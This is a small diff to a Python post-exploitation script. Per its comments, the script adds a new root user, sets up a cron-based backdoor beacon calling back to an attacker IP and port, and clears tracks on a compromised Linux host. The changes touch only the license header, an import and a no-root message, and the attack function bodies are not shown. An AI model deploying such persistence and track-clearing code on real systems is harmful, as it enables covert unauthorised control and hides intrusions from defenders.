@@ -1,6 +1,9 @@
 #!/usr/bin/python3
 # author: suffs811
-# github: https://github.com/cysec11/scripts.git
+# Copyright (c) 2023 suffs811
+# https://github.com/suffs811/the-terminator.git
+# read the README.md file for more details; software distributed under MIT license
+#
 # purpose: script for establishing persistence on root-compromised linux machine (adding new root user and backdoor beacon on target box)
 # 
 # usage: python3 pers.py -u 'pepe' -p 'password' 10.0.0.1 4444
@@ -8,7 +11,6 @@
 
 import os
 import argparse
-import crypt
 
 
 parser = argparse.ArgumentParser(description="script for adding new root user and creating callback to local machine\nusage: pers.py -u 'pepe' -p 'password' 10.0.0.1 4444")
@@ -129,3 +131,5 @@ if is_root or args.force:
 	callback(local_ip, local_port, username, password)
 	cron_make()
 	clear_tracks()
+else:
+	print("\n*** you do not have root permissions!!! ***")
